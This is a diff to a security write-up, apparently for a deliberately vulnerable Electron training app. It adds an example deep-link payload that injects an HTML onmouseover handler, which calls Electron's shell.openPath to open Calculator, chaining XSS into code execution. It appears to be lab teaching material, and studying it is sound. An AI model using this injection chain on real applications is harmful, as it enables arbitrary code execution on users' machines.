@@ -24,4 +24,8 @@ The app is registered with a deep-link of `dvea://` which is used to add tasks t
 
 # Deep-link to RCE
 
-Now combining all the above attack vectors we can chain the deep link to achieve RCE using the same payload as in "XSS to RCE" when invoked via the deep link.
+Now combining all the above attack vectors we can chain the deep link to achieve RCE using the same payload as in "XSS to RCE" when invoked via the deep link, the payload will look something like
+
+```
+dvea://task?add=<a onmouseover="try{const%20 {shell}=require('electron');shell.openPath('/System/Applications/Calculator.app/')}catch(e){console.error(e)}">Hover Me</a>
+```
